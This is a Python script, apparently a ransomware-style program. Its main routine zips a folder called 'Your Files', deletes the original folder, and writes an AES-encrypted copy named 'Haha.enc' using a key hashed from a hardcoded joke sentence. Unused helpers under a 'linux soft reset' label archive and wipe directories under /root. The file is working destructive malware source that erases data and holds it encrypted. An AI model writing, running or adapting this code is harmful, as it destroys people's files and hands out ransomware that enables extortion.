import os
import zipfile
import shutil
import subprocess
# import pwd
from tqdm import tqdm
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import sha256
from datetime import datetime
from zipfile import ZipFile, ZIP_DEFLATED

BLOCK_SIZE = AES.block_size
secret_message = "Theyll never guess that minecraft was the enemy all along. And the treasure? The diamonds we mined along the way? Certainly not!"
KEY = sha256(secret_message.encode()).digest()

BACKUP_BASE = "/root/linux_soft_reset_backups"
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
BACKUP_FILE = os.path.join(BACKUP_BASE, f"linux_reset_backup_{TIMESTAMP}.zip")

def ensure_backup_dir():
    os.makedirs(BACKUP_BASE, exist_ok=True)
    print(f"[*] Backup archive will be saved to: {BACKUP_FILE}")

def add_folder_to_zip(zipf, folder_path: str, arc_base: str):
    if not os.path.exists(folder_path):
        return

    for root, _, files in os.walk(folder_path):
        for file in files:
            full_path = os.path.join(root, file)
            rel_path = os.path.relpath(full_path, folder_path)
            arcname = os.path.join(arc_base, rel_path)
            try:
                zipf.write(full_path, arcname=arcname)
            except Exception as e:
                print(f"  !! Failed to archive {full_path}: {e}")

def clean_directory(path):
    if not os.path.exists(path):
        return

    print(f"[*] Cleaning {path}...")
    for filename in os.listdir(path):
        filepath = os.path.join(path, filename)
        try:
            if os.path.isfile(filepath) or os.path.islink(filepath):
                os.unlink(filepath)
            elif os.path.isdir(filepath):
                shutil.rmtree(filepath)
        except Exception as e:
            print(f"  !! Failed to delete {filepath}: {e}")
def zip_folder_with_progress_and_log(folder_path: str, zip_path: str, log_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf, \
         open(log_path, 'w', encoding='utf-8') as logf, \
         tqdm(desc="📦 Zipping", unit="file") as pbar:

        file_list = [os.path.join(root, f)
                     for root, _, files in os.walk(folder_path)
                     for f in files]

        pbar.total = len(file_list)

        for abs_path in file_list:
            arcname = os.path.relpath(abs_path, start=folder_path)
            zipf.write(abs_path, arcname)
            logf.write(f"{arcname}\n")  # Save file path relative to root
            pbar.update(1)

    print(f"📝 Log saved to: {log_path}")


def encrypt_file_with_progress(input_path, output_path, key):
    filesize = os.path.getsize(input_path)
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv

    with open(input_path, 'rb') as fin, open(output_path, 'wb') as fout, tqdm(total=filesize, desc="🔐 Encrypting", unit="B", unit_scale=True) as pbar:
        fout.write(iv)
        while chunk := fin.read(4096):
            if len(chunk) % BLOCK_SIZE != 0:
                chunk = pad(chunk, BLOCK_SIZE)
            fout.write(cipher.encrypt(chunk))
            pbar.update(len(chunk))


def encrypt_folder(folder_path, output_enc, log_path="encrypted_log.txt"):
    temp_zip = "temp_maze.zip"

    # 1. Zip + create log
    zip_folder_with_progress_and_log(folder_path, temp_zip, log_path)

    # 2. 🔥 Delete original folder
    print(f"🧨 Deleting original folder: {folder_path}")
    shutil.rmtree(folder_path)
    print("✅ Original folder deleted.")

    # 3. Encrypt zip file
    encrypt_file_with_progress(temp_zip, output_enc, KEY)

    # 4. Cleanup
    os.remove(temp_zip)
    print(f"✅ Encrypted to {output_enc}")


if __name__ == "__main__":
    encrypt_folder("Your Files", "Haha.enc")